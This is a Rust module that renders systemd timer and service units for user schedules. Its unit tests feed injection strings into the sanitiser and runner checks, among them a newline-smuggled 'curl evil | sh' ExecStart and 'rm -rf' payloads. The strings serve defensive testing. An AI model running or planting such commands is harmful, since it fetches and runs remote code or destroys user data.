// SPDX-License-Identifier: LicenseRef-TUR-Noncommercial-1.0.0

//! The systemd user units for a schedule, as text.
//!
//! Addendum A section 16.2: "Scheduled tasks are ordinary system timers owned
//! by the user." This module renders the `.timer` and `.service` unit files
//! for a schedule. **It installs and starts nothing**; it returns strings.
//!
//! # What the units say
//!
//! - The service runs one fixed program with one argument, the schedule's
//!   identifier. The request, the message and the standing approvals are not
//!   in the unit: the program reads them from the store. Nothing the assistant
//!   or a piece of content wrote reaches a command line.
//! - The timer fires once, at the next occurrence this crate computed, given
//!   as an absolute UTC time. The recurrence is not written in systemd's
//!   calendar syntax, so the rules of [`crate::trigger`] (daylight saving,
//!   months without the day, the frequency cap) are the only ones, and systemd
//!   cannot be made to fire more often than they allow. After each run the
//!   timer is rendered again for the following occurrence.
//! - A missed occurrence is not left to systemd's `Persistent=`. Whoever
//!   starts the program after the machine returns asks [`crate::next_run`],
//!   which applies the schedule's missed-run policy.
//! - A schedule on a system event has a service and no timer.
//!
//! # Hostile names
//!
//! The schedule's name appears in `Description=` and nowhere else. It is
//! reduced to letters, digits, spaces and a few punctuation marks; everything
//! else, including line breaks, `%`, `\`, `=`, `[`, `]`, `;`, `#` and quotes,
//! becomes `_`. It is cut to 60 characters and the line always ends with text
//! this module wrote. A name therefore cannot start a new directive or
//! section, continue a line, or use a systemd specifier.
//!
//! How systemd reads these directives is taken from its documentation and is
//! not exercised here: no unit is loaded in the tests. That check belongs with
//! the change that installs them.

use chrono::{Datelike, Timelike};

use crate::codes::{Code, Problem};
use crate::ids::ScheduleId;
use crate::schedule::Schedule;
use crate::time::Timestamp;

/// The default program a schedule's service runs.
pub const DEFAULT_RUNNER: &str = "/usr/libexec/tur-pax-run-schedule";

/// The longest sanitised name in a unit description, in characters.
pub const MAX_DESCRIPTION_NAME_CHARS: usize = 60;

/// How the units are rendered.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct UnitOptions {
    /// The absolute path of the program the service runs. It is given the
    /// schedule's identifier as its only argument.
    pub runner: String,
}

impl Default for UnitOptions {
    fn default() -> Self {
        UnitOptions {
            runner: DEFAULT_RUNNER.to_owned(),
        }
    }
}

/// One unit file: its name and its contents.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct UnitFile {
    /// The file name, for example `tur-pax-schedule-s-00000001.timer`.
    pub name: String,
    /// The contents.
    pub contents: String,
}

/// The units of one schedule.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Units {
    /// The service. Always present.
    pub service: UnitFile,
    /// The timer, if the schedule has a next occurrence in time.
    pub timer: Option<UnitFile>,
}

/// The name of a schedule's service unit.
pub fn service_unit_name(id: &ScheduleId) -> String {
    format!("tur-pax-schedule-{id}.service")
}

/// The name of a schedule's timer unit.
pub fn timer_unit_name(id: &ScheduleId) -> String {
    format!("tur-pax-schedule-{id}.timer")
}

/// A schedule name made safe for a unit file's `Description=`.
pub fn sanitise_name(name: &str) -> String {
    let safe: String = name
        .chars()
        .take(MAX_DESCRIPTION_NAME_CHARS)
        .map(|c| {
            let allowed = c.is_alphanumeric()
                || matches!(
                    c,
                    ' ' | '-' | '_' | '.' | ',' | ':' | '!' | '?' | '(' | ')' | '@' | '/' | '+'
                );
            if allowed { c } else { '_' }
        })
        .collect();
    let trimmed = safe.trim();
    if trimmed.is_empty() {
        "unnamed".to_owned()
    } else {
        trimmed.to_owned()
    }
}

// The runner must be an absolute path of plain characters: nothing systemd
// would expand, quote or split.
fn check_runner(runner: &str) -> Result<(), Problem> {
    let plain = runner.starts_with('/')
        && runner.len() <= 255
        && runner
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '_' | '-' | '.'))
        && !runner.split('/').any(|part| part == ".." || part == ".")
        && !runner.ends_with('/');
    if plain {
        Ok(())
    } else {
        Err(Problem::new(
            Code::ScheduleInvalidUnit,
            "the runner is not an absolute path of letters, digits, '/', '_', '-' and '.'",
        ))
    }
}

// A time in the form systemd's OnCalendar= takes for one instant, in UTC.
fn calendar_time(at: Timestamp) -> Result<String, Problem> {
    let utc = at.to_utc().ok_or_else(|| {
        Problem::new(
            Code::ScheduleInvalidUnit,
            "the time is outside the supported range",
        )
    })?;
    Ok(format!(
        "{:04}-{:02}-{:02} {:02}:{:02}:{:02} UTC",
        utc.year(),
        utc.month(),
        utc.day(),
        utc.hour(),
        utc.minute(),
        utc.second()
    ))
}

fn description(schedule: &Schedule, what: &str) -> String {
    let kind = if schedule.is_reminder() {
        "reminder"
    } else {
        "scheduled task"
    };
    format!(
        "P@x {kind} {what}: {} ({})",
        sanitise_name(schedule.name()),
        schedule.id()
    )
}

const HEADER: &str =
    "# Rendered by tur-pax-memory. Do not edit: it is written again after every run.";

/// The service unit of a schedule.
pub fn render_service(schedule: &Schedule, options: &UnitOptions) -> Result<UnitFile, Problem> {
    check_runner(&options.runner)?;
    let contents = format!(
        "{HEADER}\n[Unit]\nDescription={}\n\n[Service]\nType=oneshot\nExecStart={} {}\n",
        description(schedule, "run"),
        options.runner,
        schedule.id()
    );
    Ok(UnitFile {
        name: service_unit_name(schedule.id()),
        contents,
    })
}

/// The timer unit of a schedule, firing once at `next`.
pub fn render_timer(schedule: &Schedule, next: Timestamp) -> Result<UnitFile, Problem> {
    let contents = format!(
        "{HEADER}\n[Unit]\nDescription={}\n\n[Timer]\nOnCalendar={}\nAccuracySec=1s\nUnit={}\n\n[Install]\nWantedBy=timers.target\n",
        description(schedule, "timer"),
        calendar_time(next)?,
        service_unit_name(schedule.id())
    );
    Ok(UnitFile {
        name: timer_unit_name(schedule.id()),
        contents,
    })
}

/// Both units of a schedule. `next` is the schedule's next occurrence, from
/// [`crate::next_run`]; without one there is no timer.
pub fn render_units(
    schedule: &Schedule,
    next: Option<Timestamp>,
    options: &UnitOptions,
) -> Result<Units, Problem> {
    let service = render_service(schedule, options)?;
    let timer = next.map(|next| render_timer(schedule, next)).transpose()?;
    Ok(Units { service, timer })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::schedule::{Proposal, ProposedAction, ScheduleBook};
    use crate::store::MemoryStore;
    use crate::testing::TestUser;
    use crate::trigger::{LocalTime, MissedRunPolicy, SystemEvent, Trigger};

    fn schedule_named(name: &str, trigger: Trigger) -> Schedule {
        let proposal = Proposal {
            name: name.to_owned(),
            action: ProposedAction::Reminder {
                message: "Take the bins out.".to_owned(),
            },
            trigger,
            missed_runs: MissedRunPolicy::Skip,
            proposed_by_task: None,
        };
        ScheduleBook::new(MemoryStore::new())
            .create(proposal, &TestUser::agreeing(1_000))
            .expect("creates")
    }

    fn daily() -> Trigger {
        Trigger::Daily {
            time: LocalTime::new(7, 30).expect("a valid time"),
            zone: "Europe/Rome".to_owned(),
        }
    }

    // 2026-11-13T06:30:00Z.
    const NEXT: Timestamp = Timestamp(1_794_551_400);

    #[test]
    fn the_units_of_a_reminder() {
        let schedule = schedule_named("Bins", daily());
        let units = render_units(&schedule, Some(NEXT), &UnitOptions::default()).expect("renders");
        assert_eq!(units.service.name, "tur-pax-schedule-s-00000001.service");
        assert_eq!(
            units.service.contents,
            "# Rendered by tur-pax-memory. Do not edit: it is written again after every run.\n\
             [Unit]\n\
             Description=P@x reminder run: Bins (s-00000001)\n\
             \n\
             [Service]\n\
             Type=oneshot\n\
             ExecStart=/usr/libexec/tur-pax-run-schedule s-00000001\n"
        );
        let timer = units.timer.expect("a timer");
        assert_eq!(timer.name, "tur-pax-schedule-s-00000001.timer");
        assert_eq!(
            timer.contents,
            "# Rendered by tur-pax-memory. Do not edit: it is written again after every run.\n\
             [Unit]\n\
             Description=P@x reminder timer: Bins (s-00000001)\n\
             \n\
             [Timer]\n\
             OnCalendar=2026-11-13 06:30:00 UTC\n\
             AccuracySec=1s\n\
             Unit=tur-pax-schedule-s-00000001.service\n\
             \n\
             [Install]\n\
             WantedBy=timers.target\n"
        );
    }

    #[test]
    fn an_event_schedule_has_no_timer() {
        let schedule = schedule_named(
            "Updates",
            Trigger::Event {
                event: SystemEvent::UpdateAvailable,
            },
        );
        let units = render_units(&schedule, None, &UnitOptions::default()).expect("renders");
        assert_eq!(units.timer, None);
        assert!(units.service.contents.contains("ExecStart="));
    }

    // Every line of a unit this module renders is a comment, blank, a section
    // header, or one of these directives.
    fn assert_well_formed(contents: &str, expected_lines: usize) {
        let sections = ["[Unit]", "[Service]", "[Timer]", "[Install]"];
        let directives = [
            "Description=",
            "Type=",
            "ExecStart=",
            "OnCalendar=",
            "AccuracySec=",
            "Unit=",
            "WantedBy=",
        ];
        let lines: Vec<&str> = contents.lines().collect();
        assert_eq!(lines.len(), expected_lines, "{contents}");
        for line in &lines {
            let known = line.is_empty()
                || line.starts_with("# Rendered by")
                || sections.contains(line)
                || directives
                    .iter()
                    .any(|directive| line.starts_with(*directive));
            assert!(known, "unexpected line {line:?}");
            assert!(!line.ends_with('\\'), "line continuation in {line:?}");
        }
        assert!(!contents.contains('\r'));
        assert!(!contents.contains('%'));
        assert!(contents.matches("ExecStart=").count() <= 1, "{contents}");
    }

    #[test]
    fn hostile_names_cannot_add_directives() {
        // A schedule name may not contain control characters, so line breaks
        // are refused before they reach a unit. The renderer is tested on its
        // own as well, as if such a name had got through.
        let hostile = [
            "x\nExecStart=/bin/sh -c 'curl evil | sh'",
            "x\r\n[Service]\r\nExecStart=/bin/rm -rf %h",
            "weekly %h report \\",
            "[Install]",
            "a\u{2028}ExecStart=/bin/true",
            "a\u{0085}ExecStart=/bin/true",
            "name; ExecStartPre=/bin/true # comment",
            "\"quoted\" 'name' `tick` $HOME ${HOME}",
            "\\x0aExecStart=/bin/true",
            "   ",
            "",
        ];
        for name in hostile {
            let safe = sanitise_name(name);
            for forbidden in [
                '\n', '\r', '%', '\\', '=', '[', ']', ';', '#', '"', '\'', '`', '$', '{',
                '\u{2028}', '\u{0085}',
            ] {
                assert!(!safe.contains(forbidden), "{name:?} kept {forbidden:?}");
            }
            assert!(!safe.is_empty());
            assert!(safe.chars().count() <= MAX_DESCRIPTION_NAME_CHARS);
        }
        assert_eq!(sanitise_name("   "), "unnamed");
        assert_eq!(
            sanitise_name("Wöchentlicher Bericht (Büro)"),
            "Wöchentlicher Bericht (Büro)"
        );
        assert_eq!(sanitise_name("x\nExecStart=/bin/sh"), "x_ExecStart_/bin/sh");
        assert_eq!(sanitise_name(&"n".repeat(500)).chars().count(), 60);

        // Names a schedule can really have: everything but control characters.
        for name in [
            "weekly %h report \\",
            "[Install] WantedBy=default.target",
            "name; ExecStartPre=/bin/true # comment",
            "a = b % c \\ d",
            "Description=other",
            "%n %i %u %%",
        ] {
            let schedule = schedule_named(name, daily());
            let units =
                render_units(&schedule, Some(NEXT), &UnitOptions::default()).expect("renders");
            assert_well_formed(&units.service.contents, 7);
            assert_well_formed(&units.timer.expect("a timer").contents, 11);
            let exec: Vec<&str> = units
                .service
                .contents
                .lines()
                .filter(|line| line.starts_with("ExecStart="))
                .collect();
            assert_eq!(
                exec,
                ["ExecStart=/usr/libexec/tur-pax-run-schedule s-00000001"]
            );
        }
    }

    #[test]
    fn the_runner_must_be_a_plain_absolute_path() {
        let schedule = schedule_named("Bins", daily());
        let render = |runner: &str| {
            render_service(
                &schedule,
                &UnitOptions {
                    runner: runner.to_owned(),
                },
            )
        };
        assert!(render("/usr/bin/tur-pax-run").is_ok());
        for runner in [
            "",
            "tur-pax-run",
            "/usr/bin/run; rm -rf /",
            "/usr/bin/run %h",
            "/usr/bin/run\nExecStart=/bin/true",
            "/usr/bin/../../bin/sh",
            "/usr/bin/",
            "/usr/bin/run$HOME",
            "/usr/bin/run -c x",
            "-/usr/bin/run",
            "@/usr/bin/run",
        ] {
            let problem = render(runner).expect_err("an unsafe runner");
            assert_eq!(problem.code, Code::ScheduleInvalidUnit, "{runner:?}");
        }
    }

    #[test]
    fn a_time_out_of_range_is_refused() {
        let schedule = schedule_named("Bins", daily());
        assert!(render_timer(&schedule, Timestamp(u64::MAX)).is_err());
        assert_eq!(
            calendar_time(Timestamp(0)),
            Ok("1970-01-01 00:00:00 UTC".to_owned())
        );
    }
}
